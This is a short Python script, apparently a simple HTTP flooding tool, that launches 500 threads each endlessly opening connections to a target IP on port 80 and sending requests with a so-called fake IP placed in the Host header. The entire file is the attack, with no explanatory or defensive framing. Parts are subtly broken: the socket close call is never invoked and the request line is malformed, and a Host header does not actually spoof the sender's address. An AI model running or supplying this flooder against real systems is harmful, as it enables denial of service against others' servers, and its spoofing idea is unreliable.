import threading
import socket

target = '192.168.1.2'
port = 80
fake_ip = '182.21.20.32'

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
